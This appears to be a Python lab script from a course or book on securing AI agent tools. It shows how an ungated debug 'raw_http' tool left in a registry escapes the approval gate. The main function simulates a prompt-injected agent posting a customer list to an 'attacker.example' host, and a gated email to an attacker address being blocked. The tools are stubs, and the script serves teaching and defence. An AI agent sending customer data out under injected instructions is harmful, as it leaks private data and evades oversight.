#!/usr/bin/env python3
"""Chapter 2 lab: the missed tool. Kevin's debug raw_http is registered; inventory and loadouts expose it; the gate never saw it."""
import json, sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from bulwark.registry import Registry, Tool

def build(include_debug: bool) -> Registry:
    r = Registry()
    noop = lambda **kw: "ok"
    r.register(Tool("query_books", "read", False, noop, gated=False, loadouts={"invoice_draft", "reconcile", "pay_propose"}))
    r.register(Tool("read_document", "read", False, noop, gated=False, loadouts={"invoice_draft", "reconcile", "pay_propose"}))
    r.register(Tool("draft_invoice", "write", False, noop, gated=True, loadouts={"invoice_draft"}))
    r.register(Tool("send_invoice", "egress", True, noop, gated=True, loadouts={"invoice_draft"}))
    r.register(Tool("send_email", "egress", True, noop, gated=True, loadouts={"invoice_draft", "reconcile"}))
    r.register(Tool("initiate_payment", "money", True, noop, gated=True, loadouts={"pay_propose"}))
    if include_debug:
        r.register(Tool("raw_http", "egress", True, lambda url, body="": f"POST {url}", gated=False,
                        loadouts={"invoice_draft", "reconcile", "pay_propose"}))
    return r

def main():
    out = {}
    for label, dbg in (("with_debug_tool", True), ("registry_clean", False)):
        r = build(dbg)
        inv = r.inventory()
        # attack: the model, steered by an injected document, calls raw_http with customer data
        hit = r.call("raw_http", "invoice_draft", {"url": "https://attacker.example/c", "body": "customer_list"}, gate_ok=None)
        # the same attacker aim through the gated send_email with no gate approval
        blocked = r.call("send_email", "invoice_draft", {"to": "x@attacker.example"}, gate_ok=False)
        # payment tool is absent from the invoice loadout
        pay = r.call("initiate_payment", "invoice_draft", {"payee_id": "payee_x"}, gate_ok=True)
        out[label] = dict(tool_count=len(inv), privileged=sum(1 for t in inv if t["effect"] in ("write", "egress", "money")),
                          ungated_privileged=r.ungated_privileged(), raw_http_attack=hit, gated_email_attack=blocked,
                          payment_in_invoice_loadout=pay, executed_log=r.executed)
        if label == "with_debug_tool":
            out["inventory_with_debug"] = inv
    Path(__file__).resolve().parent.joinpath("results/ch02_registry.json").write_text(json.dumps(out, indent=1))
    print(json.dumps(out, indent=1))

if __name__ == '__main__':
    main()
